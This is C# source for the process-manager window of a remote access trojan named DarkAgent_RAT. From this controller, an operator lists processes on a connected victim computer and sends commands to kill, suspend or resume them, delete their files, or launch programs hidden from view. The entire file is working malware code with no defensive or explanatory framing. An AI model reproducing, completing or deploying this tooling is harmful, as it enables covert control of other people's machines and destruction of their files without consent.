using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using DarkAgent_RAT.src.Events;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using DarkAgent_RAT.src.Utils;

namespace DarkAgent_RAT
{

    public partial class ProcessMgr : DevComponents.DotNetBar.Office2007Form
    {
        public ProcessMgr()
        {
            InitializeComponent();
        }

        public string RemoteIP;
        public string ClientName;
        public int ClientID;

        #region Specific Events

        public void onProcessInfo(object o, ProcessEventArgs e)
        {
            if (e.RemoteIP != RemoteIP)
                return;
            
            string[] str = new string[9];
            str[0] = e.processInfo.ProcessName;
            str[1] = e.processInfo.PID.ToString();
            str[2] = e.processInfo.WindowsTitle;
            str[3] = e.processInfo.Responding.ToString();
            str[4] = e.processInfo.FileLocation;
            str[5] = e.processInfo.Handle.ToString();
            str[6] = e.processInfo.ProcessorAffinity.ToString();
            str[7] = e.processInfo.Threads.ToString();
            str[8] = e.processInfo.Priority;
            ListViewItem itm = new ListViewItem(str, 0);
            listView4.Items.Add(itm);
        }

        public void onClientDisconnect(object o, ClientDisconnectEventArgs e)
        {
            if(RemoteIP == e.RemoteIP)
            {
                MessageBox.Show(ClientName + " has been disconnected from the server");
                this.Close();
            }
        }

        #endregion

        #region Form Events

        private void ProcessMgr_Load(object sender, EventArgs e)
        {
            this.Text = "DarkAgent - Process Manager [" + RemoteIP.Split(':')[0] + "] [" + ClientName + "]";
            ProcessEvent.ClientProcesses += new GetProcessesHandler(onProcessInfo);
            ClientDisconnectEvent.ClientDisconnect += new ClientDisconnectHandler(onClientDisconnect);

            //send packet...
            RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_GetProcesses(RatClientProcessor.Instance._clientList[ClientID]));
        }

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for(int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_KillProcess(RatClientProcessor.Instance._clientList[ClientID], Convert.ToInt32(listView4.SelectedItems[i].SubItems[1].Text), 0, 0));
        }

        private void forceKillProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_KillProcess(RatClientProcessor.Instance._clientList[ClientID], Convert.ToInt32(listView4.SelectedItems[i].SubItems[1].Text), 1, 0));
        }

        private void forceKillDeleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you want to kill and delete the selected processes ?", this.Text, MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                return;

            for (int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_KillProcess(RatClientProcessor.Instance._clientList[ClientID], Convert.ToInt32(listView4.SelectedItems[i].SubItems[1].Text), 1, 1));
        }

        private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_SuspendProcess(RatClientProcessor.Instance._clientList[ClientID], Convert.ToInt32(listView4.SelectedItems[i].SubItems[1].Text)));
        }

        private void resumeProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_ResumeProcess(RatClientProcessor.Instance._clientList[ClientID], Convert.ToInt32(listView4.SelectedItems[i].SubItems[1].Text)));
        }

        private void setWindowTextToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_ProcessWindowText(RatClientProcessor.Instance._clientList[ClientID], Convert.ToInt32(listView4.SelectedItems[i].SubItems[1].Text), toolStripTextBox1.Text));
        }

        private void copyToClipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClipboardBuilder cB = new ClipboardBuilder();
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
            {
                cB.WriteLine("Process: " + listView4.SelectedItems[i].SubItems[0].Text);
                cB.WriteLine("PID: " + listView4.SelectedItems[i].SubItems[1].Text);
                cB.WriteLine("Window Title: " + listView4.SelectedItems[i].SubItems[2].Text);
                cB.WriteLine("Responding: " + listView4.SelectedItems[i].SubItems[3].Text);
                cB.WriteLine("File Location: " + listView4.SelectedItems[i].SubItems[4].Text);
                cB.WriteLine("Handle: " + listView4.SelectedItems[i].SubItems[5].Text);
                cB.WriteLine("Processor Affinity: " + listView4.SelectedItems[i].SubItems[6].Text);
                cB.WriteLine("Threads: " + listView4.SelectedItems[i].SubItems[7].Text);
                cB.WriteLine("Priority: " + listView4.SelectedItems[i].SubItems[8].Text);
                cB.WriteLine("");
            }
            if (!cB.Finish())
                MessageBox.Show("Error while copying data!");
        }

        private void viewLoadeddllsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for(int i = 0; i < listView4.SelectedItems.Count; i++)
            {
                new LoadedDll
                {
                    RemoteIP = this.RemoteIP,
                    ClientName = this.ClientName,
                    ClientID = this.ClientID,
                    ProcessName = listView4.SelectedItems[i].SubItems[0].Text,
                    PID = Convert.ToInt32(listView4.SelectedItems[i].SubItems[1].Text)
                }.Show();
            }
        }

        private void viewRunningThreadsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
            {
                new ProcessThreads
                {
                    RemoteIP = this.RemoteIP,
                    ClientName = this.ClientName,
                    ClientID = this.ClientID,
                    ProcessName = listView4.SelectedItems[i].SubItems[0].Text,
                    PID = Convert.ToInt32(listView4.SelectedItems[i].SubItems[1].Text)
                }.Show();
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView4.Items.Clear();
            RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_GetProcesses(RatClientProcessor.Instance._clientList[ClientID]));
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_StartProcess(RatClientProcessor.Instance._clientList[ClientID], toolStripTextBox2.Text, 0));
        }

        private void startHiddenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_StartProcess(RatClientProcessor.Instance._clientList[ClientID], toolStripTextBox2.Text, 1));
        }

        private void startSelectedProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_StartProcess(RatClientProcessor.Instance._clientList[ClientID], listView4.SelectedItems[i].SubItems[4].Text, 0));
        }

        private void listView4_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            switch (e.Column)
            {
                case 0:
                    listView4.ListViewItemSorter = new ColumnSorter(0);
                    listView4.Sort();
                    break;
                case 1:
                    listView4.ListViewItemSorter = new ColumnSorter(1);
                    listView4.Sort();
                    break;
                case 2:
                    listView4.ListViewItemSorter = new ColumnSorter(2);
                    listView4.Sort();
                    break;
                case 3:
                    listView4.ListViewItemSorter = new ColumnSorter(3);
                    listView4.Sort();
                    break;
                case 4:
                    listView4.ListViewItemSorter = new ColumnSorter(4);
                    listView4.Sort();
                    break;
                case 5:
                    listView4.ListViewItemSorter = new ColumnSorter(5);
                    listView4.Sort();
                    break;
                case 6:
                    listView4.ListViewItemSorter = new ColumnSorter(6);
                    listView4.Sort();
                    break;
                case 7:
                    listView4.ListViewItemSorter = new ColumnSorter(7);
                    listView4.Sort();
                    break;
                case 8:
                    listView4.ListViewItemSorter = new ColumnSorter(8);
                    listView4.Sort();
                    break;
            }
        }

        private void viewProcessLocationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView4.SelectedItems.Count; i++)
            {
                string tmp = listView4.SelectedItems[i].SubItems[4].Text;
                new FileManager(tmp.Substring(0, tmp.Length - tmp.Substring(tmp.LastIndexOf("\\") + 1).Length))
                {
                    RemoteIP = this.RemoteIP,
                    ClientName = this.ClientName,
                    ClientID = this.ClientID
                }.Show();
            }
        }

        #endregion

        private void ProcessMgr_FormClosing(object sender, FormClosingEventArgs e)
        {
            ProcessEvent.ClientProcesses -= new GetProcessesHandler(onProcessInfo);
            ClientDisconnectEvent.ClientDisconnect -= new ClientDisconnectHandler(onClientDisconnect);
        }
    }
}